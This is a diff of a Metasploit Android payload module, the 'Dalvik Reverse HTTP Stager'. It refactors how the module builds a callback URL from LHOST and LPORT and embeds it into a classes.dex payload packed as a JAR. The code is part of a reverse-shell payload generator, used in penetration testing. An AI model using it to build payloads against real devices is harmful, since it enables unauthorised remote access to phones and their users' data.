@@ -17,15 +17,15 @@ module Metasploit3
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Dalvik Reverse HTTP Stager',
-      'Description'   => 'Tunnel communication over HTTP',
-      'Author'        => 'anwarelmakrahy',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'android',
-      'Arch'          => ARCH_DALVIK,
-      'Handler'       => Msf::Handler::ReverseHttp,
-      'Stager'        => {'Payload' => ""}
-      ))
+      'Name'        => 'Dalvik Reverse HTTP Stager',
+      'Description' => 'Tunnel communication over HTTP',
+      'Author'      => ['anwarelmakrahy', 'OJ Reeves'],
+      'License'     => MSF_LICENSE,
+      'Platform'    => 'android',
+      'Arch'        => ARCH_DALVIK,
+      'Handler'     => Msf::Handler::ReverseHttp,
+      'Stager'      => {'Payload' => ''}
+    ))
   end
 
   def generate_jar(opts={})
@@ -36,13 +36,12 @@ module Metasploit3
       uri_req_len = 5
     end
 
-    lurl = "ZZZZhttp://#{datastore["LHOST"]}"
-    lurl << ":#{datastore["LPORT"]}" if datastore["LPORT"]
-    lurl << "/"
-    lurl << generate_uri_uuid_mode(:init_java, uri_req_len)
+    url = "http://#{datastore["LHOST"]}:#{datastore["LPORT"]}/"
+    # TODO: perhaps wire in an existing UUID from opts?
+    url << generate_uri_uuid_mode(:init_java, uri_req_len)
 
     classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
-    string_sub(classes, 'ZZZZ' + ' ' * 512, lurl)
+    string_sub(classes, 'ZZZZ' + ' ' * 512, 'ZZZZ' + url)
     apply_options(classes)
 
     jar = Rex::Zip::Jar.new
